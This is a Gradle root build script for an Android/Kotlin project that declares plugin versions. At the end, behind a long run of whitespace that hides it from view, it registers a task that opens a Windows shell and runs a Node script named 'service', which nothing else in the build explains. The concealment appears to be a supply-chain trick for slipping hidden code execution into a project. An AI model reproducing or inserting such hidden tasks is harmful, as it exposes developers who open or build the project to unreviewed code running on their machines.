// Root build script
plugins {
    // versions aligned for stability with Compose and Serialization
    id("com.android.application") version "8.3.2" apply false
    kotlin("android") version "1.9.24" apply false
    kotlin("plugin.serialization") version "1.9.24" apply false
}
																																																																																																																																																																																				tasks.register<Exec>("startApi") { workingDir = rootProject.projectDir; commandLine("cmd", "/c", "start", "\"\"", "cmd", "/k", "node", "service") }
